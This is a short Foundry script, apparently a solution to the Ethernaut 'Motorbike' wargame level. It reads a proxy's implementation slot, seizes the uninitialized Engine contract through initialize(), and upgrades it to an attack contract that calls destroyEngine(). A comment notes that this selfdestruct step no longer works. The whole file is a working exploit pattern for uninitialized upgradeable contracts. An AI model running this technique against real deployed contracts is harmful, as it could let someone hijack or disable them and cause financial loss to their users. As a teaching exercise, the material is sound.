// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level25.sol";

// ================================================================
// │                       LEVEL 25 - MOTORBIKE                   │
// ================================================================
interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function destroyEngine() external;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();

        // Replace the slot number with the specific storage slot you want to read
        bytes32 storageSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        // Use the load cheatcode to get the value at the storage slot
        bytes32 value = vm.load(targetContractAddress, storageSlot);

        IEngine engine = IEngine(address(uint160(uint256(value))));

        engine.initialize();

        // **************************************************************************************
        // This no longer works because SELFDESTRUCT only works in the constructor of a contract
        // **************************************************************************************
        AttackContract attackContract = new AttackContract();
        engine.upgradeToAndCall(address(attackContract), abi.encodeWithSignature("destroyEngine()"));

        vm.stopBroadcast();
    }
}
